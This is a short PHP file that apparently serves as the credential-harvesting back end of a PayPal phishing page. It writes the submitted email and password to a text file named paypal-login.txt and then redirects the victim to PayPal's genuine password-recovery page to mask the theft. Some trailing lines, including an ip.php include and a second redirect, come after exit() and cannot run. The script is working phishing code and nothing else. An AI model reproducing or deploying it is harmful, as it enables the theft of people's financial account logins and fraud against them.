<?php

file_put_contents("paypal-login.txt", "Paypal Username: " . $_POST['login_email'] . " Passwords: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.com/authflow/password-recovery/');
exit();
include 'ip.php';
header('Location:login.html');
exit
?>
